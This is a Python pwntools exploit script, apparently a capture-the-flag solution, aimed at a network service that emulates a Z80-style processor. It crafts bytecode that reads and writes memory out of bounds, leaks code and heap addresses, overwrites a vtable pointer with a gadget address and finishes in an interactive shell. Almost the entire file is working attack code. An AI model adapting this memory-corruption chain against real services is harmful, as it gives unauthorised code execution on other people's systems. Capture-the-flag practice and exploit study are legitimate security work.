#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
import base64
import string

host = "10.211.55.28"
port = 8888

r = remote(host,port)


def setax(val):
    oparray = ">"
    oparray += chr(val)
    return oparray

def setrix(val):
    oparray = "\xdd"
    oparray += chr(0x18+9)
    oparray += p16(val)
    return oparray

def writemem(offset,val):
    oparray = setax(val)
    oparray += setrix(offset)
    oparray += "\xdd" + chr(0x6d+9)
    oparray += "\x00"
    return oparray

def readmem(offset):
    oparray = "\xdd"
    oparray += chr(0x21+9)
    oparray += p16(offset)
    return oparray

def loadnode(_id,tok):
    r.recvuntil("4. exit")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(_id)
    r.recvuntil(":")
    r.sendline(tok)

def setnode(_id,tok,cont,cmd):
    r.recvuntil("4. exit")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(_id)
    r.recvuntil(":")
    r.sendline(tok)
    r.recvuntil(":")
    r.sendline(cont)
    r.recvuntil(":")
    r.sendline(base64.b64encode(cmd))

def runcmd(cmd):
    r.recvuntil("4. exit")
    r.sendline("6")
    r.recvuntil(":")
    r.sendline(base64.b64encode(cmd))

def leak(offset):
    runcmd(readmem(offset))
    r.recvuntil("IX:")
    r.recvuntil("IX:")
    data =r.recvuntil("\n")[:-1]
    return int(data.strip(),16)


def strike(c):
    r.recvuntil("4. exit")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(c))
    #r.sendline("8822114542800170613")


rand_str = lambda n: ''.join([random.choice(string.lowercase) for i in xrange(n)])
s = rand_str(10)
cmd = writemem(0xfff6,0xff)
raw_input()
setnode(s,s,s,cmd)
codeptr = 0
for i in range(6):
    codeptr |= leak(0xffe8+i) << 8*i
codebase = codeptr - 0x20ed70
print "code:",hex(codebase)
loadnode(s,s)
heapptr = 0
for i in range(6):
    heapptr |= leak(0xfff8+i) << 8*i
heapbase = heapptr - 0x50
print "heap:",hex(heapbase)
vtable = heapptr - 0x8000 + 0x10
cmd = ""
sys = codebase + 0x9ad9
for i in range(6):
    cmd += writemem(0xffe8+i,(vtable >> 8*i) & 0xff) 
cmd = cmd.ljust(0x38,"\x00")
cmd += p64(sys)*8
runcmd(cmd)
sh = codebase + 0xbc3
strike(sh)
r.interactive()
